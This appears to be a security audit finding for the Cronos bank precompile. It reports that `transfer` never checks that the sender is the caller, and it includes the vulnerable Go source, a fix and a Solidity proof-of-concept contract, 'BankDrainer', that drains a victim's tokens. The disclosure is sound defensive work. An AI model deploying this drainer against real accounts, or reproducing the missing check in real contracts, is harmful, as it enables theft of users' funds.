### Title
Bank Precompile `transfer` Missing Caller-Authorization Check Enables Unauthorized Native Token Drain - (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The `transfer` method of the bank precompile (`BankContract`) accepts an arbitrary `sender` address as a call argument but never verifies that the EVM caller (`contract.Caller()`) is authorized to move funds from that address. Any unprivileged EVM contract can therefore drain `evm/<itsAddress>` native tokens from any account that holds them, without the account owner's consent.

---

### Finding Description

`BankContract.Run` in `x/cronos/keeper/precompiles/bank.go` handles the `TransferMethodName` case as follows:

```go
sender := args[0].(common.Address)   // taken from call arguments – no auth check
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // evm/<callerAddress>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The denom is scoped to `contract.Caller()`, but the **source of funds** (`from`) is taken verbatim from the ABI-decoded argument. There is no check that `sender == contract.Caller()`, and there is no allowance/approval mechanism. The only guard present is a blocked-address check on the *recipient*, not the sender. [2](#0-1) 

The intended usage, as shown in the integration-test helper contract, always passes `msg.sender` as the first argument:

```solidity
return bank.transfer(msg.sender, recipient, amount);
``` [3](#0-2) 

Nothing in the precompile enforces this convention.

---

### Impact Explanation

**Critical – Unauthorized transfer of precompile-controlled assets.**

`evm/<contractAddress>` tokens are native Cosmos bank-module coins whose entire supply is minted and managed through the bank precompile. They fall squarely within "precompile-controlled assets."

Attack scenario:

1. A DeFi contract (`VaultContract`) uses `bank.mint(user, amount)` to issue `evm/VaultContract` receipt tokens to depositors in exchange for real assets (CRO, IBC vouchers, CRC20 tokens).
2. An attacker (or a compromised/malicious `VaultContract`) calls `bank.transfer(user, attacker, amount)` — passing the victim as `sender` and the attacker as `recipient`.
3. The precompile executes `bankKeeper.SendCoins(ctx, user, attacker, coins)` unconditionally.
4. The victim's receipt tokens are gone; they can no longer redeem their underlying deposit.

Because the denom is `evm/<callerAddress>`, the attacker can only drain tokens of their own denomination — but that is precisely the denomination users hold as receipts/shares in any protocol built on the bank precompile. The accounting manipulation is direct and irreversible. [4](#0-3) 

---

### Likelihood Explanation

**Medium.** The attack requires users to hold `evm/<attackerContract>` tokens, which only occurs when a contract has previously minted them (e.g., as part of a yield-bearing vault, LP share, or receipt-token protocol). Any such protocol built on the bank precompile is immediately vulnerable to its own contract (or any contract that can invoke it) draining user balances without consent. No admin permission, governance action, or key compromise is required — a single unprivileged EVM transaction suffices.

---

### Recommendation

Add a caller-authorization guard at the top of the `TransferMethodName` case:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must equal caller")
}
```

Alternatively, implement an ERC-20-style allowance mapping inside the precompile so that `transferFrom`-style semantics are possible while still requiring explicit approval from the token holder. [1](#0-0) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract BankDrainer {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<address(this)> tokens to victim
    function seed(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain them back — no approval from victim required
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller of the precompile = address(this)
        // precompile never checks sender == msg.sender
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `BankDrainer` on Cronos EVM.
2. Call `seed(victim, 1000)` — victim now holds 1000 `evm/<BankDrainer>` native tokens.
3. Call `drain(victim, attacker, 1000)` — the precompile executes `bankKeeper.SendCoins(victim → attacker, 1000 evm/<BankDrainer>)` with no authorization from `victim`.
4. Victim's balance is zero; attacker holds 1000 `evm/<BankDrainer>` tokens.

In a real protocol, step 2 is replaced by users legitimately depositing assets and receiving receipt tokens; step 3 is the exploit that steals those receipts. [5](#0-4)

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	default:
		return nil, errors.New("unknown method")
	}
}
